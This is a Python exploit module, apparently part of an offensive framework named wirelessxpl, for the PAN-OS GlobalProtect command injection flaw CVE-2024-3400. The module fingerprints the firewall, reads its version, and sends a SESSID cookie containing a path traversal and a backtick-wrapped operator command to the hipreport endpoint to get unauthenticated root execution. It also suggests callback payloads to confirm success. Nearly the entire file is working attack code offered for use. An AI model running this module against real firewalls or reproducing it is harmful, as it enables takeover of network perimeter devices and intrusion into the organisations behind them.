# Author: André Henrique (LinkedIn/X: @mrhenrike)
import ssl
import urllib.request
import urllib.error

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Palo Alto PAN-OS GlobalProtect OS Command Injection RCE (CVE-2024-3400).

    A command injection vulnerability in the GlobalProtect feature of
    Palo Alto Networks PAN-OS allows an unauthenticated attacker to
    execute arbitrary OS commands with root privileges on the firewall.

    The vulnerability exists in the way GlobalProtect handles session
    identifiers (SESSID cookie). A crafted SESSID value containing shell
    metacharacters is passed unsanitized to an OS command, enabling
    direct command injection.

    Actively exploited since at least March 2024 (Operation MidnightEclipse).

    Affected: PAN-OS 10.2.x, 11.0.x, 11.1.x with GlobalProtect enabled.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "PAN-OS GlobalProtect Command Injection RCE (CVE-2024-3400)",
        "description": (
            "Exploits CVE-2024-3400 via OS command injection in the Palo Alto "
            "PAN-OS GlobalProtect gateway/portal. The SESSID cookie value is "
            "passed to a system command without sanitization, allowing "
            "unauthenticated root-level command execution. Actively exploited "
            "since March 2024 (Operation MidnightEclipse)."
        ),
        "authors": (
            "Volexity (discovery, initial report)",
            "Palo Alto Networks PSIRT (advisory)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-3400",
            "https://security.paloaltonetworks.com/CVE-2024-3400",
            "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/",
        ),
        "devices": (
            "Palo Alto Networks PA-Series (PAN-OS 10.2.x, 11.0.x, 11.1.x)",
            "Palo Alto Networks VM-Series (same PAN-OS versions)",
            "GlobalProtect gateway or portal must be enabled",
        ),
    }

    target = OptIP("", "Target IPv4 address of the PAN-OS firewall")
    port = OptPort(443, "GlobalProtect HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject (default: id)")

    _GP_PORTAL_PATH = "/global-protect/portal/css/login.css"
    _GP_LOGIN_PATH = "/global-protect/login.esp"
    _GP_HIPREPORT_PATH = "/ssl-vpn/hipreport.esp"

    def _make_url(self, path: str) -> str:
        return f"https://{self.target}:{self.port}{path}"

    def _http_request(
        self, url: str, method: str = "GET",
        headers: dict | None = None, data: bytes | None = None,
    ) -> tuple[int, str, dict]:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", "Mozilla/5.0")

        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace") if exc.fp else ""
            return exc.code, body, dict(exc.headers) if exc.headers else {}
        except Exception as exc:
            raise ConnectionError(f"HTTP request failed: {exc}") from exc

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to have "
                f"GlobalProtect enabled"
            )
            return

        print_success("GlobalProtect portal/gateway detected, attempting command injection")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect GlobalProtect portal or gateway presence."""
        for path in (self._GP_LOGIN_PATH, self._GP_PORTAL_PATH):
            try:
                status, body, headers = self._http_request(self._make_url(path))
                body_lower = body.lower()
                if any(
                    marker in body_lower
                    for marker in ("globalprotect", "global-protect", "pan-os", "palo alto")
                ):
                    return True
                server = headers.get("Server", "").lower()
                if "paloalto" in server or "pan-os" in server:
                    return True
                if status == 200 and "login.css" in path:
                    return True
            except ConnectionError:
                continue
        return False

    def _detect_version(self) -> str:
        """Try to extract PAN-OS version from the GlobalProtect response."""
        import re
        try:
            _, body, _ = self._http_request(self._make_url(self._GP_LOGIN_PATH))
            match = re.search(r"pan-os-version[\"']?\s*[:=]\s*[\"']?([0-9.]+)", body)
            if match:
                return match.group(1)
            match = re.search(r"version\s*=\s*[\"']([0-9.]+)", body)
            if match:
                return match.group(1)
        except ConnectionError:
            pass
        return "unknown"

    def _exploit(self) -> None:
        version = self._detect_version()
        print_status(f"Detected PAN-OS version: {version}")

        injected_sessid = f"../../../opt/panlogs/tmp/device_telemetry/hour/aaa`{self.command}`"
        print_status(
            f"Injecting command via SESSID cookie to {self._GP_HIPREPORT_PATH}"
        )
        print_info(f"Payload SESSID: {injected_sessid[:80]}...")

        headers = {
            "Cookie": f"SESSID={injected_sessid}",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        body = b"user=wxpl_probe&portal=GlobalProtect&clientVer=1&os=Windows"

        try:
            status, response, resp_headers = self._http_request(
                self._make_url(self._GP_HIPREPORT_PATH),
                method="POST",
                headers=headers,
                data=body,
            )

            print_info(f"Server returned HTTP {status}")

            if status in (200, 502):
                print_success(
                    f"Request accepted (HTTP {status}). If the target is vulnerable, "
                    f"the command '{self.command}' was executed with root privileges. "
                    "To confirm execution, use a blind callback (e.g., DNS or HTTP "
                    "canary) as the command."
                )
            elif status == 404:
                print_info(
                    "The hipreport endpoint returned 404. GlobalProtect may not "
                    "have the HIP check feature enabled, or the path differs."
                )
            elif status == 403:
                print_info(
                    "Access denied (403). IP-based access restrictions or "
                    "WAF rules may be blocking the request."
                )
            else:
                print_info(
                    f"Unexpected HTTP {status}. Manual verification with a "
                    "callback-based payload is recommended."
                )

            if response:
                preview = response[:200].replace("\n", " ").strip()
                if preview:
                    print_info(f"Response excerpt: {preview}")

        except ConnectionError as exc:
            print_error(f"Connection failed during injection: {exc}")
